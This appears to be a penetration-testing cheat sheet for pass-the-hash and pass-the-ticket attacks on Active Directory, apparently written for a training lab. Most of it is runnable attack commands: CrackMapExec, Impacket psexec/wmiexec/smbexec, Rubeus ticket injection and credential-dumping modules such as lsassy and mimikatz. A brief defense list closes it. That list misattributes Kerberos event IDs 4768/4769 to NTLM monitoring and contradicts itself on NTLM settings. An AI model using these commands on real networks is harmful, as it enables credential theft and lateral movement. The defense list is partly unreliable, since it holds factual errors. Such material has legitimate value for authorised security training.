# PASS-THE-HASH & PASS-THE-TICKET ATTACKS

Use stolen credentials or Kerberos tickets without knowing plaintext passwords. Critical for lateral movement in Active Directory environments.

## Pass-the-Hash with CrackMapExec

Execute commands using NTLM hash:

```bash
crackmapexec smb 10.0.2.0/24 -u fcastle -H hash -p '' -d MARVEL.local
crackmapexec smb 10.0.2.0/24 -u fcastle -H hash --sam
crackmapexec smb 10.0.2.0/24 -u fcastle -H hash -d MARVEL.local -x 'whoami'
```

## Pass-the-Hash with Impacket

```bash
impacket-psexec -hashes :hash MARVEL.local/fcastle@10.0.2.16
impacket-wmiexec -hashes :hash MARVEL.local/fcastle@10.0.2.16
impacket-smbexec -hashes :hash MARVEL.local/fcastle@10.0.2.16
```

## Pass-the-Ticket

Use stolen Kerberos tickets:

```bash
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass MARVEL.local/fcastle@10.0.2.16
```

### Rubeus (Windows)

```powershell
rubeus.exe ptt /ticket:base64_encoded_ticket
rubeus.exe createnetonly /program:cmd.exe /show
```

## Network Scanning

Enumerate SMB hosts and test hash authentication:

```bash
crackmapexec smb 10.0.2.0/24 -u fcastle -d MARVEL.local -p Password1
crackmapexec smb 10.0.2.0/24 -u fcastle -H hash -d MARVEL.local
```

## CrackMapExec Modules

```bash
crackmapexec smb -L
crackmapexec smb -M lsassy
```

Common modules: `lsassy`, `mimikatz`, `gpp_decrypt`, `bloodhound`

## Defense

- Enforce NTLMv2 only (disable NTLM)
- Enable Kerberos authentication
- Require SMB signing
- Monitor NTLM authentication logs (Event ID 4768, 4769)
- Restrict domain admin accounts
